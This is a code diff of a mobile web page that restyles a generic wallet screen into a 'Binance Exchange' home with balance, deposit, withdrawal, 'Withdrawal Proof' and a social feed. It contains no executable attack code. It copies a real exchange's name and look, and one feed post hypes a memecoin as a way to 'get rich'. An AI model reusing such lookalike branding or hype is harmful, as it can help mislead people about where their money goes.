@@ -3,367 +3,527 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Crypto Wallet</title>
-  <link rel="stylesheet" href="css/binance-style.css">
+  <title>Binance Exchange</title>
+  <link rel="stylesheet" href="css/binance-premium.css">
+  <link rel="stylesheet" href="css/components.css">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <style>
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+    .tab-selector {
+      display: flex;
+      gap: 0;
+      background: var(--card-color);
+      padding: 4px;
+      margin: 0;
+      border-radius: 12px;
+    }
+    .tab-btn {
+      flex: 1;
+      padding: 10px 16px;
+      background: transparent;
+      border: none;
+      color: var(--text-secondary);
+      font-weight: 500;
+      cursor: pointer;
+      border-radius: 8px;
+      transition: all 0.3s;
+    }
+    .tab-btn.active {
+      background: var(--bg-tertiary);
+      color: var(--text-color);
+    }
+    .social-actions {
+      display: flex;
+      justify-content: space-around;
+      padding: 16px;
+      background: var(--card-color);
+      border-radius: 12px;
+      margin-bottom: 16px;
+    }
+    .social-action-btn {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+      text-decoration: none;
+      color: var(--text-color);
+    }
+    .social-action-icon {
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      background: var(--bg-tertiary);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      color: var(--text-secondary);
+    }
+    .social-action-label {
+      font-size: 12px;
+      color: var(--text-secondary);
+    }
+  </style>
 </head>
 <body>
   <div class="app-container">
-
     <!-- Header -->
-    <header class="app-header">
-      <button class="menu-btn">
+    <header class="app-header" style="background: var(--card-color); padding: 16px;">
+      <button class="btn-icon btn-ghost" id="menuBtn">
         <i class="fas fa-bars"></i>
       </button>
-      <div class="tab-selector">
-        <button class="tab-btn">Exchange</button>
-        <button class="tab-btn active">Wallet</button>
+      <div class="header-title" style="font-size: 18px; font-weight: 600;">Binance Exchange</div>
+      <div class="header-right">
+        <button class="btn-icon btn-ghost" id="notificationBtn">
+          <i class="fas fa-bell"></i>
+        </button>
+        <button class="btn-icon btn-ghost" id="themeToggleBtn">
+          <i class="fas fa-headphones"></i>
+        </button>
       </div>
-      <button class="search-btn">
-        <i class="fas fa-search"></i>
-      </button>
     </header>
 
-    <!-- Wallet Header -->
-    <div class="wallet-header">
-      <div class="wallet-title">
-        <i class="fas fa-wallet wallet-icon"></i>
-        <h2>My Wallet</h2>
-        <i class="fas fa-chevron-down"></i>
+    <!-- Added Exchange/Wallet tab switcher -->
+    <div style="padding: 12px 16px; background: var(--background-color);">
+      <div class="tab-selector">
+        <button class="tab-btn active">Exchange</button>
+        <button class="tab-btn" onclick="window.location.href='defi-wallet.html'">Wallet</button>
       </div>
-      <button class="copy-btn">
-        <i class="far fa-copy"></i>
+    </div>
+
+    <!-- Added Balance Section with action buttons -->
+    <div style="padding: 16px; background: var(--card-color); margin: 0 16px 16px; border-radius: 12px;">
+      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+        <span style="font-size: 14px; color: var(--text-secondary);">Est. Total Value (BTC)</span>
+        <i class="fas fa-chevron-up" style="color: var(--text-secondary);"></i>
+      </div>
+      <div style="font-size: 32px; font-weight: 700; margin-bottom: 4px;" id="balanceValue">0.00000000</div>
+      <div style="font-size: 14px; color: var(--text-secondary); margin-bottom: 16px;">≈ $0.00</div>
+      
+      <button class="btn btn-primary" style="width: 100%; margin-bottom: 16px;" onclick="window.location.href='deposit.html'">
+        Add Funds
+      </button>
+
+      <!-- Action grid with 8 buttons -->
+      <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px;">
+        <a href="#" class="social-action-btn">
+          <div class="social-action-icon" style="background: var(--bg-tertiary);">
+            <i class="fas fa-users" style="color: var(--primary-color);"></i>
+          </div>
+          <span class="social-action-label">P2P</span>
+        </a>
+        <a href="deposit.html" class="social-action-btn">
+          <div class="social-action-icon" style="background: var(--bg-tertiary);">
+            <i class="fas fa-arrow-down" style="color: var(--primary-color);"></i>
+          </div>
+          <span class="social-action-label">Deposit</span>
+        </a>
+        <a href="withdraw.html" class="social-action-btn">
+          <div class="social-action-icon" style="background: var(--bg-tertiary);">
+            <i class="fas fa-arrow-up" style="color: var(--primary-color);"></i>
+          </div>
+          <span class="social-action-label">Withdraw Fiat</span>
+        </a>
+        <a href="send.html" class="social-action-btn">
+          <div class="social-action-icon" style="background: var(--bg-tertiary);">
+            <i class="fas fa-exchange-alt" style="color: var(--primary-color);"></i>
+          </div>
+          <span class="social-action-label">Transfer</span>
+        </a>
+        <a href="transactions.html" class="social-action-btn">
+          <div class="social-action-icon" style="background: var(--bg-tertiary);">
+            <i class="fas fa-file-alt" style="color: var(--primary-color);"></i>
+          </div>
+          <span class="social-action-label">Withdrawal Proof</span>
+        </a>
+        <a href="#" class="social-action-btn">
+          <div class="social-action-icon" style="background: var(--bg-tertiary);">
+            <i class="fas fa-shopping-bag" style="color: var(--primary-color);"></i>
+          </div>
+          <span class="social-action-label">Buy crypto</span>
+        </a>
+        <a href="#" class="social-action-btn">
+          <div class="social-action-icon" style="background: var(--bg-tertiary);">
+            <i class="fas fa-credit-card" style="color: var(--primary-color);"></i>
+          </div>
+          <span class="social-action-label">Pay</span>
+        </a>
+        <a href="#" class="social-action-btn">
+          <div class="social-action-icon" style="background: var(--bg-tertiary);">
+            <i class="fas fa-ellipsis-h" style="color: var(--text-secondary);"></i>
+          </div>
+          <span class="social-action-label">More</span>
+        </a>
+      </div>
+    </div>
+
+    <!-- Expand asset trend chart dropdown -->
+    <div style="padding: 0 16px 16px;">
+      <button style="width: 100%; padding: 12px; background: var(--card-color); border: none; border-radius: 8px; color: var(--text-color); display: flex; justify-content: space-between; align-items: center;">
+        <span>Expand asset trend chart</span>
+        <i class="fas fa-chevron-down"></i>
       </button>
     </div>
 
-    <!-- Balance -->
-    <div class="balance-container">
-      <h1 class="balance-amount" id="balanceAmount">$<span id="balanceValue">0.00</span></h1>
-      <button class="receive-btn" onclick="window.location.href='receive.html'">Receive</button>
+    <!-- Yellow Banner -->
+    <div style="background: linear-gradient(90deg, #FCD535 0%, #F7B731 100%); padding: 14px 16px; margin: 0 16px 16px; border-radius: 12px; display: flex; align-items: center; justify-content: space-between;">
+      <div style="color: #000; font-weight: 600; font-size: 14px;">Discover personalized home experiences!</div>
+      <i class="fas fa-arrow-right" style="color: #000; font-size: 18px;"></i>
     </div>
 
-    <!-- Action Buttons -->
-    <div class="action-buttons">
-      <a href="scan.html" class="action-btn">
-        <div class="action-icon">
-          <i class="fas fa-qrcode"></i>
+    <!-- P2P Section -->
+    <div style="padding: 0 16px 16px;">
+      <div class="card">
+        <div class="card-header" style="display: flex; justify-content: space-between; align-items: center;">
+          <h3 class="card-title">P2P</h3>
+          <i class="fas fa-chevron-right" style="color: var(--text-secondary);"></i>
         </div>
-        <span>Scan</span>
-      </a>
-      <a href="#" class="action-btn">
-        <div class="action-icon">
-          <i class="fas fa-gift"></i>
-        </div>
-        <span>Rewards</span>
-      </a>
-      <a href="transactions.html" class="action-btn">
-        <div class="action-icon">
-          <i class="fas fa-history"></i>
-        </div>
-        <span>History</span>
-      </a>
-      <a href="#" class="action-btn">
-        <div class="action-icon">
-          <i class="fas fa-coins"></i>
-        </div>
-        <span>Earn</span>
-      </a>
-      <a href="#" class="action-btn">
-        <div class="action-icon">
-          <i class="fas fa-ellipsis-h"></i>
-        </div>
-        <span>More</span>
-      </a>
-    </div>
-
-    <!-- Promo Banner -->
-    <div class="promo-banner">
-      <div class="promo-content">
-        <h3>Join 8th Exclusive TGE with StakeStone on PancakeSwap</h3>
-        <button class="explore-btn">Explore Now</button>
-      </div>
-      <div class="promo-image">
-        <img src="img/exclusive.png" alt="Promo" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'80\' height=\'80\' viewBox=\'0 0 24 24\' fill=\'%23FFD700\' stroke=\'%23FFD700\' stroke-width=\'1\'><circle cx=\'12\' cy=\'12\' r=\'10\'/><path d=\'M8 12h8M12 8v8\' stroke=\'%23000\' stroke-width=\'2\'/></svg>'">
-      </div>
-    </div>
-
-    <!-- Token Tabs -->
-    <div class="token-tabs">
-      <button class="token-tab active">Watchlist</button>
-      <button class="token-tab">BSC</button>
-      <button class="token-tab">Alpha</button>
-      <button class="token-tab">Trending</button>
-      <button class="token-tab">Newest</button>
-      <button class="token-tab">Solana</button>
-    </div>
-
-    <!-- Token List Header -->
-    <div class="token-list-header">
-      <div class="token-header-item">
-        <span>Vol</span>
-        <i class="fas fa-sort"></i>
-        /
-        <span>Market Cap</span>
-        <i class="fas fa-sort"></i>
-      </div>
-      <div class="token-header-item">
-        <span>Last Price</span>
-        <i class="fas fa-sort"></i>
-        /
-        <span>24h Change</span>
-        <i class="fas fa-sort"></i>
-      </div>
-    </div>
-
-    <!-- Token List -->
-    <div class="token-list" id="tokenList">
-      <!-- TRX Token -->
-      <div class="token-item" data-token="TRX">
-        <div class="token-info">
-          <div class="token-icon">
-            <img src="img/sto.png" alt="TRX" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'40\' height=\'40\' viewBox=\'0 0 24 24\' fill=\'%23FF0000\' stroke=\'%23FFFFFF\' stroke-width=\'1\'><circle cx=\'12\' cy=\'12\' r=\'10\'/><path d=\'M8 12h8M12 8v8\' stroke=\'%23FFFFFF\' stroke-width=\'0\'/></svg>'">
-          </div>
-          <div class="token-details">
-            <h3>STO</h3>
-            <div class="token-market">
-              <span class="market-cap">$9.81M</span>
-              <span class="volume">$15.04M</span>
+        <div class="card-body">
+          <div style="display: flex; align-items: center; justify-content: space-between;">
+            <div style="display: flex; align-items: center; gap: 12px;">
+              <img src="img/exclusive.png" alt="USDT" style="width: 32px; height: 32px; border-radius: 50%;" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'32\' height=\'32\' viewBox=\'0 0 24 24\' fill=\'%2326A17B\'><circle cx=\'12\' cy=\'12\' r=\'10\'/></svg>'">
+              <div>
+                <div style="font-weight: 600;">USDT/USD</div>
+                <div style="font-size: 12px; color: var(--text-secondary);">Buy</div>
+              </div>
+            </div>
+            <div style="text-align: right;">
+              <div style="font-weight: 700; font-size: 18px;">$0.992</div>
+              <div style="font-size: 12px; color: var(--text-secondary);">—</div>
             </div>
           </div>
-        </div>
-        <div class="token-price">
-          <div class="price-value">$0.066762</div>
-          <div class="price-change negative">-9.98%</div>
-        </div>
-      </div>
-
-      <!-- USDT Token -->
-      <div class="token-item" data-token="USDT">
-        <div class="token-info">
-          <div class="token-icon">
-            <img src="img/pump.png" alt="USDT" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'40\' height=\'40\' viewBox=\'0 0 24 24\' fill=\'%2326A17B\' stroke=\'%23FFFFFF\' stroke-width=\'1\'><circle cx=\'12\' cy=\'12\' r=\'10\'/><path d=\'M8 12h8M12 8v8\' stroke=\'%23FFFFFF\' stroke-width=\'0\'/></svg>'">
-          </div>
-          <div class="token-details">
-            <h3>PUMP</h3>
-            <div class="token-market">
-              <span class="market-cap">$1.85M</span>
-              <span class="volume">$11.72M</span>
-            </div>
-          </div>
-        </div>
-        <div class="token-price">
-          <div class="price-value">$1.00</div>
-          <div class="price-change neutral">0.00%</div>
-        </div>
-      </div>
-
-      <!-- USDC Token -->
-      <div class="token-item" data-token="USDC">
-        <div class="token-info">
-          <div class="token-icon">
-            <img src="img/yt.png" alt="USDC" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'40\' height=\'40\' viewBox=\'0 0 24 24\' fill=\'%232775CA\' stroke=\'%23FFFFFF\' stroke-width=\'1\'><circle cx=\'12\' cy=\'12\' r=\'10\'/><path d=\'M8 12h8M12 8v8\' stroke=\'%23FFFFFF\' stroke-width=\'0\'/></svg>'">
-          </div>
-          <div class="token-details">
-            <h3>Youtube</h3>
-            <div class="token-market">
-              <span class="market-cap">$24.72M</span>
-              <span class="volume">$4.65M</span>
-            </div>
-          </div>
-        </div>
-        <div class="token-price">
-          <div class="price-value">$1.01</div>
-          <div class="price-change positive">+0.01%</div>
-        </div>
-      </div>
-
-      <!-- BNB Token -->
-      <div class="token-item" data-token="BNB">
-        <div class="token-info">
-          <div class="token-icon">
-            <img src="img/dd.png" alt="BNB" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'40\' height=\'40\' viewBox=\'0 0 24 24\' fill=\'%23F3BA2F\' stroke=\'%23FFFFFF\' stroke-width=\'1\'><circle cx=\'12\' cy=\'12\' r=\'10\'/><path d=\'M8 12h8M12 8v8\' stroke=\'%23FFFFFF\' stroke-width=\'0\'/></svg>'">
-          </div>
-          <div class="token-details">
-            <h3>DonkeyDrama</h3>
-            <div class="token-market">
-              <span class="market-cap">$5.74M</span>
-              <span class="volume">$360.1K</span>
-            </div>
-          </div>
-        </div>
-        <div class="token-price">
-          <div class="price-value">$610.38</div>
-          <div class="price-change positive">+0.73%</div>
-        </div>
-      </div>
-
-      <!-- SOL Token -->
-      <div class="token-item" data-token="SOL">
-        <div class="token-info">
-          <div class="token-icon">
-            <img src="img/yellow.png" alt="SOL" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'40\' height=\'40\' viewBox=\'0 0 24 24\' fill=\'%239945FF\' stroke=\'%23FFFFFF\' stroke-width=\'1\'><circle cx=\'12\' cy=\'12\' r=\'10\'/><path d=\'M8 12h8M12 8v8\' stroke=\'%23FFFFFF\' stroke-width=\'0\'/></svg>'">
-          </div>
-          <div class="token-details">
-            <h3>YELLOW</h3>
-            <div class="token-market">
-              <span class="market-cap">$351.93K</span>
-              <span class="volume">$213.51K</span>
-            </div>
-          </div>
-        </div>
-        <div class="token-price">
-          <div class="price-value">$126.54</div>
-          <div class="price-change positive">+1.41%</div>
         </div>
       </div>
     </div>
 
-    <!-- Earn Section -->
-    <div class="earn-section">
-      <div class="section-header">
-        <h2 class="section-title">Earn</h2>
-        <i class="fas fa-chevron-right section-more"></i>
-      </div>
-      
-      <div class="earn-cards">
-        <!-- BNB Card -->
-        <div class="earn-card">
-          <div class="earn-token">
-            <div class="earn-token-icon">
-              <img src="img/bnb.png" alt="BNB" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'24\' height=\'24\' viewBox=\'0 0 24 24\' fill=\'%23F3BA2F\' stroke=\'%23FFFFFF\' stroke-width=\'1\'><circle cx=\'12\' cy=\'12\' r=\'10\'/><path d=\'M8 12h8M12 8v8\' stroke=\'%23FFFFFF\' stroke-width=\'0\'/></svg>'">
-            </div>
-            <div class="earn-token-name">BNB</div>
-          </div>
-          <div class="earn-apy">29.89% APY</div>
+    <!-- Fear & Greed Index -->
+    <div style="padding: 0 16px 16px;">
+      <div class="card">
+        <div class="card-header" style="display: flex; justify-content: space-between; align-items: center;">
+          <h3 class="card-title">Fear & Greed</h3>
+          <i class="fas fa-chevron-right" style="color: var(--text-secondary);"></i>
         </div>
-        
-        <!-- ETH Card -->
-        <div class="earn-card">
-          <div class="earn-token">
-            <div class="earn-token-icon">
-              <img src="img/eth.png" alt="ETH" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'24\' height=\'24\' viewBox=\'0 0 24 24\' fill=\'%23627EEA\' stroke=\'%23FFFFFF\' stroke-width=\'1\'><circle cx=\'12\' cy=\'12\' r=\'10\'/><path d=\'M8 12h8M12 8v8\' stroke=\'%23FFFFFF\' stroke-width=\'0\'/></svg>'">
+        <div class="card-body">
+          <div style="display: flex; align-items: center; gap: 20px;">
+            <div style="position: relative; width: 100px; height: 100px;">
+              <svg width="100" height="100" viewBox="0 0 100 100">
+                <circle cx="50" cy="50" r="40" fill="none" stroke="var(--bg-tertiary)" stroke-width="12"/>
+                <circle cx="50" cy="50" r="40" fill="none" stroke="#4CAF50" stroke-width="12" 
+                  stroke-dasharray="108 252" stroke-dashoffset="0" transform="rotate(-90 50 50)"/>
+                <circle cx="50" cy="50" r="40" fill="none" stroke="#FCD535" stroke-width="12" 
+                  stroke-dasharray="108 252" stroke-dashoffset="-108" transform="rotate(-90 50 50)"/>
+              </svg>
+              <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-weight: 700; font-size: 24px;">43</div>
             </div>
-            <div class="earn-token-name">ETH</div>
-          </div>
-          <div class="earn-apy">3.89% APY</div>
-        </div>
-        
-        <!-- BTCB Card -->
-        <div class="earn-card">
-          <div class="earn-token">
-            <div class="earn-token-icon">
-              <img src="img/btc.png" alt="BTCB" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'24\' height=\'24\' viewBox=\'0 0 24 24\' fill=\'%23F7931A\' stroke=\'%23FFFFFF\' stroke-width=\'1\'><circle cx=\'12\' cy=\'12\' r=\'10\'/><path d=\'M8 12h8M12 8v8\' stroke=\'%23FFFFFF\' stroke-width=\'0\'/></svg>'">
+            <div>
+              <div style="font-weight: 600; font-size: 18px; margin-bottom: 4px;">Neutral</div>
+              <div style="font-size: 12px; color: var(--text-secondary);">Market sentiment</div>
             </div>
-            <div class="earn-token-name">BTCB</div>
           </div>
-          <div class="earn-apy">0.03% APY</div>
         </div>
       </div>
     </div>
 
-    <!-- DApps Section -->
-    <div class="dapps-section">
-      <div class="section-header">
-        <h2 class="section-title">DApps</h2>
-        <i class="fas fa-chevron-right section-more"></i>
-      </div>
-      
-      <div class="dapps-tabs">
-        <button class="dapps-tab">Favorites</button>
-        <button class="dapps-tab active">Hot</button>
-        <button class="dapps-tab">Recent</button>
-      </div>
-      
-      <div class="dapps-grid">
-        <!-- Stakestone TGE -->
-        <div class="dapp-item">
-          <div class="dapp-icon">
-            <img src="img/sto.png" alt="Stakestone" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'48\' height=\'48\' viewBox=\'0 0 24 24\' fill=\'%23FFFFFF\' stroke=\'%23000000\' stroke-width=\'1\'><polygon points=\'12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5 12 2\'/></svg>'">
+    <!-- Market tabs and crypto list -->
+    <div style="padding: 0 16px 16px;">
+      <div class="card">
+        <div class="card-body" style="padding-top: 0;">
+          <div style="display: flex; gap: 16px; padding: 16px 0; border-bottom: 1px solid var(--border-color); overflow-x: auto;">
+            <button class="btn btn-sm" style="background: var(--primary-color); color: #000; white-space: nowrap;">Hot</button>
+            <button class="btn btn-sm btn-ghost" style="white-space: nowrap;">Favorites</button>
+            <button class="btn btn-sm btn-ghost" style="white-space: nowrap;">Alpha</button>
+            <button class="btn btn-sm btn-ghost" style="white-space: nowrap;">New</button>
+            <button class="btn btn-sm btn-ghost" style="white-space: nowrap;">Gainers</button>
           </div>
-          <div class="dapp-info">
-            <div class="dapp-name">Stakestone TGE</div>
-            <div class="dapp-description">Ethereum staking service provider.</div>
+          
+          <div style="padding-top: 8px;">
+            <div style="display: flex; justify-content: space-between; padding: 8px 0; color: var(--text-secondary); font-size: 12px; border-bottom: 1px solid var(--border-color);">
+              <span>Name</span>
+              <span>Last Price</span>
+              <span>24h chg%</span>
+            </div>
+            
+            <!-- Crypto list items -->
+            <div style="display: flex; align-items: center; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid var(--border-color);">
+              <div style="display: flex; align-items: center; gap: 12px;">
+                <img src="img/bnb.png" alt="BNB" style="width: 32px; height: 32px; border-radius: 50%;" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'32\' height=\'32\' viewBox=\'0 0 24 24\' fill=\'%23F3BA2F\'><circle cx=\'12\' cy=\'12\' r=\'10\'/></svg>'">
+                <div>
+                  <div style="font-weight: 600;">BNB</div>
+                  <div style="font-size: 12px; color: var(--text-secondary);">BNB</div>
+                </div>
+              </div>
+              <div style="text-align: right;">
+                <div style="font-weight: 600;">856.81</div>
+                <div style="font-size: 12px; color: var(--text-secondary);">$856.81</div>
+              </div>
+              <div style="background: rgba(76, 175, 80, 0.1); color: #4CAF50; padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: 600;">
+                +1.67%
+              </div>
+            </div>
+
+            <div style="display: flex; align-items: center; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid var(--border-color);">
+              <div style="display: flex; align-items: center; gap: 12px;">
+                <img src="img/btc.png" alt="BTC" style="width: 32px; height: 32px; border-radius: 50%;" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'32\' height=\'32\' viewBox=\'0 0 24 24\' fill=\'%23F7931A\'><circle cx=\'12\' cy=\'12\' r=\'10\'/></svg>'">
+                <div>
+                  <div style="font-weight: 600;">BTC</div>
+                  <div style="font-size: 12px; color: var(--text-secondary);">BTC</div>
+                </div>
+              </div>
+              <div style="text-align: right;">
+                <div style="font-weight: 600;">110,788.05</div>
+                <div style="font-size: 12px; color: var(--text-secondary);">$110,788.05</div>
+              </div>
+              <div style="background: rgba(76, 175, 80, 0.1); color: #4CAF50; padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: 600;">
+                +3.63%
+              </div>
+            </div>
+
+            <div style="display: flex; align-items: center; justify-content: space-between; padding: 12px 0;">
+              <div style="display: flex; align-items: center; gap: 12px;">
+                <img src="img/crypto-article.png" alt="XRP" style="width: 32px; height: 32px; border-radius: 50%;" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'32\' height=\'32\' viewBox=\'0 0 24 24\' fill=\'%2323292F\'><circle cx=\'12\' cy=\'12\' r=\'10\'/></svg>'">
+                <div>
+                  <div style="font-weight: 600;">XRP</div>
+                  <div style="font-size: 12px; color: var(--text-secondary);">XRP</div>
+                </div>
+              </div>
+              <div style="text-align: right;">
+                <div style="font-weight: 600;">3.1</div>
+                <div style="font-size: 12px; color: var(--text-secondary);">$3.1</div>
+              </div>
+              <div style="background: rgba(76, 175, 80, 0.1); color: #4CAF50; padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: 600;">
+                +5.51%
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Social Feed Section -->
+    <div style="padding: 0 16px 16px;">
+      <div class="card">
+        <div class="card-header">
+          <!-- Social action buttons -->
+          <div style="display: flex; justify-content: space-around; padding-bottom: 16px; border-bottom: 1px solid var(--border-color);">
+            <a href="#" class="social-action-btn">
+              <div class="social-action-icon">
+                <i class="fas fa-user-plus"></i>
+              </div>
+              <span class="social-action-label">Add Friends</span>
+            </a>
+            <a href="#" class="social-action-btn">
+              <div class="social-action-icon">
+                <i class="fas fa-user"></i>
+              </div>
+              <span class="social-action-label">My ID</span>
+            </a>
+            <a href="#" class="social-action-btn">
+              <div class="social-action-icon">
+                <i class="fas fa-plus"></i>
+              </div>
+              <span class="social-action-label">Invitations</span>
+            </a>
           </div>
         </div>
         
-        <!-- Aster -->
-        <div class="dapp-item">
-          <div class="dapp-icon">
-            <img src="img/ball.png" alt="Aster" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'48\' height=\'48\' viewBox=\'0 0 24 24\' fill=\'%23FFFFFF\' stroke=\'%23000000\' stroke-width=\'1\'><circle cx=\'12\' cy=\'12\' r=\'10\'/><path d=\'M12 2v20M2 12h20\' stroke=\'%23000000\' stroke-width=\'1\'/></svg>'">
-          </div>
-          <div class="dapp-info">
-            <div class="dapp-name">Aster</div>
-            <div class="dapp-description">Astherus is a metaverse...</div>
-          </div>
-        </div>
-        
-        <!-- GMGN.ai -->
-        <div class="dapp-item">
-          <div class="dapp-icon">
-            <img src="img/toy.png" alt="GMGN.ai" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'48\' height=\'48\' viewBox=\'0 0 24 24\' fill=\'%2300FF00\' stroke=\'%23000000\' stroke-width=\'1\'><rect x=\'2\' y=\'2\' width=\'20\' height=\'20\' rx=\'2\' ry=\'2\'/></svg>'">
-          </div>
-          <div class="dapp-info">
-            <div class="dapp-name">GMGN.ai</div>
-            <div class="dapp-description">GMGN.ai automates content creation...</div>
-          </div>
-        </div>
-        
-        <!-- Four.meme -->
-        <div class="dapp-item">
-          <div class="dapp-icon">
-            <img src="img/hand.png" alt="Four.meme" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'48\' height=\'48\' viewBox=\'0 0 24 24\' fill=\'%2300FFFF\' stroke=\'%23000000\' stroke-width=\'1\'><circle cx=\'12\' cy=\'12\' r=\'10\'/><path d=\'M12 2v20M2 12h20\' stroke=\'%23000000\' stroke-width=\'1\'/></svg>'">
-          </div>
-          <div class="dapp-info">
-            <div class="dapp-name">Four.meme</div>
-            <div class="dapp-description">The premier meme...</div>
-          </div>
+        <!-- Feed tabs -->
+        <div style="display: flex; gap: 16px; padding: 16px; border-bottom: 1px solid var(--border-color); overflow-x: auto;">
+          <button style="background: none; border: none; color: var(--text-color); font-weight: 600; border-bottom: 2px solid var(--primary-color); padding-bottom: 4px;">Discover</button>
+          <button style="background: none; border: none; color: var(--text-secondary); padding-bottom: 4px;">Following</button>
+          <button style="background: none; border: none; color: var(--text-secondary); padding-bottom: 4px;">Campaign</button>
+          <button style="background: none; border: none; color: var(--text-secondary); padding-bottom: 4px;">News</button>
+          <button style="background: none; border: none; color: var(--text-secondary); padding-bottom: 4px;">Announcements</button>
         </div>
 
-        <!-- Solayer checker -->
-        <div class="dapp-item">
-          <div class="dapp-icon">
-            <img src="img/sss.png" alt="Solayer" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'48\' height=\'48\' viewBox=\'0 0 24 24\' fill=\'%2300AA00\' stroke=\'%23000000\' stroke-width=\'1\'><rect x=\'2\' y=\'2\' width=\'20\' height=\'20\' rx=\'2\' ry=\'2\'/></svg>'">
+        <div class="card-body">
+         <!-- Post 1 -->
+          <div style="border-bottom: 1px solid var(--border-color); padding-bottom: 16px; margin-bottom: 16px;">
+            <div style="display: flex; align-items: start; gap: 12px;">
+              <div style="width: 40px; height: 40px; border-radius: 50%; overflow: hidden;">
+                <img src="img/post1.png" alt="hb_14" style="width: 100%; height: 100%; object-fit: cover;">
+              </div>
+              <div style="flex: 1;">
+                <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 4px;">
+                  <span style="font-weight: 600;">hb_14</span>
+                  <i class="fas fa-check-circle" style="color: var(--primary-color); font-size: 14px;"></i>
+                  <span style="font-size: 12px; color: var(--text-secondary);">16h</span>
+                </div>
+                <p style="margin-bottom: 12px; line-height: 1.5;">Cristiano Ronaldo memecoin $#CR7 is launching soon.</p>
+                <p style="margin-bottom: 12px; line-height: 1.5; color: var(--text-secondary); font-size: 14px;">Sources say it could hit $50B+ market cap, and early investors could get rich. I'll share it as soon as it goes live—just like I posted...</p>
+                <div style="display: flex; gap: 16px; color: var(--text-secondary); font-size: 14px;">
+                  <span><i class="far fa-comment"></i> 27</span>
+                  <span><i class="far fa-heart"></i> 176</span>
+                  <span><i class="fas fa-retweet"></i> 27</span>
+                  <span><i class="fas fa-share"></i></span>
+                </div>
+              </div>
+              <button style="background: none; border: none; color: var(--text-secondary);">
+                <i class="fas fa-times"></i>
+              </button>
+            </div>
           </div>
-          <div class="dapp-info">
-            <div class="dapp-name">Solayer checker</div>
-            <div class="dapp-description">Solayer is the dominant restaking...</div>
-          </div>
-        </div>
-        
-        <!-- PancakeSwap -->
-        <div class="dapp-item">
-          <div class="dapp-icon">
-            <img src="img/pan.png" alt="PancakeSwap" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'48\' height=\'48\' viewBox=\'0 0 24 24\' fill=\'%23D8A032\' stroke=\'%23000000\' stroke-width=\'1\'><circle cx=\'12\' cy=\'12\' r=\'10\'/><path d=\'M12 2v20M2 12h20\' stroke=\'%23000000\' stroke-width=\'1\'/></svg>'">
-          </div>
-          <div class="dapp-info">
-            <div class="dapp-name">PancakeSwap</div>
-            <div class="dapp-description">Decentralized exchange...</div>
+
+          <!-- Post 2 -->
+          <div>
+            <div style="display: flex; align-items: start; gap: 12px;">
+              <div style="width: 40px; height: 40px; border-radius: 50%; overflow: hidden;">
+                <img src="img/post2.png" alt="MeowAlert" style="width: 100%; height: 100%; object-fit: cover;">
+              </div>
+              <div style="flex: 1;">
+                <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 4px;">
+                  <span style="font-weight: 600;">MeowAlert</span>
+                  <i class="fas fa-check-circle" style="color: var(--primary-color); font-size: 14px;"></i>
+                  <span style="font-size: 12px; color: var(--text-secondary);">1h</span>
+                </div>
+                <p style="margin-bottom: 12px; line-height: 1.5; font-weight: 600;">🟢 Hold $XRP or Sell Now? Here's What My Research Shows</p>
+                <p style="margin-bottom: 12px; line-height: 1.5; color: var(--text-secondary); font-size: 14px;">$XRP is sitting steady around $2.98 — $3.00 and the 1h chart looks much stronger than yesterday. The EMA(7) has crossed above EMA(25) and is pr...</p>
+                <div style="background: var(--bg-tertiary); border-radius: 8px; padding: 40px; text-align: center; margin-bottom: 12px; color: var(--text-secondary);">
+                  Trading Chart
+                </div>
+                <div style="display: flex; gap: 16px; color: var(--text-secondary); font-size: 14px;">
